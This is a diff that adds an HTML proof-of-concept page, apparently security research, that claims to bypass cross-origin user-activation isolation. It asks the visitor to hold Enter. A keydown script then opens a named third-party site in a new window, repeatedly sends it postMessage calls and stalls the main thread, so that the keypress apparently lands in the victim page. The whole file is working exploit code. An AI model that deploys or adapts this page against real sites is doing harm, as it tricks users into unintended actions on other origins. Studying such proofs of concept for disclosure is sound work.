@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+
+<body style="background: #fff5f5; font-family: sans-serif; text-align: center; padding: 50px;">
+    <h1>Bypass of Cross-Origin User Activation Isolation</h1>
+    <div style="border: 2px dashed #ff4444; padding: 20px;">
+        <p>1. Click here first to focus.</p>
+        <p>2. **Press & Hold the 'Enter' key for 2 seconds.**</p>
+    </div>
+
+    <script>
+        const targetURL = "https://matomo-tester.vercel.app/";
+
+        document.addEventListener('keydown', function (event) {
+            if (event.repeat) return;
+            console.log("Keyboard dipencet. Membuka jendela target...");
+
+            const victim = window.open(targetURL, "victim_window");
+            function pump() {
+                if (!victim || victim.closed) return;
+                try {
+                    victim.postMessage("ping", "*");
+                } catch (e) { }
+
+                requestAnimationFrame(pump);
+            }
+            requestAnimationFrame(pump);
+            const start = Date.now();
+            while (Date.now() - start < 300) {
+                Math.sqrt(Math.random());
+            }
+        });
+    </script>
+</body>
+
+</html>
